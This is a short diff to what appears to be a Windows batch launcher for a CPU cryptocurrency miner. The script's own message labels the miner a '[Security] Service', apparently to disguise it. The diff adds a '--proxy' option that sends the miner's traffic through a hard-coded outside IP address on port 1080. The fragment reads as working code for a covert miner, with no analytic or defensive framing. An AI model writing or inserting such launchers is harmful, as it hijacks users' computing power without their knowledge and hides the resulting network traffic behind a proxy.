@@ -71,7 +71,8 @@ start "" "%BIN%" ^
  --cpu-threads 2 ^
  --cpu-threads-intensity 1 ^
  --cpu-threads-priority 1 ^
- --miner-priority 1
+ --miner-priority 1 ^
+ --proxy 174.138.61.184:1080
 
 echo [Security] Service launched. Window will remain open.
 pause
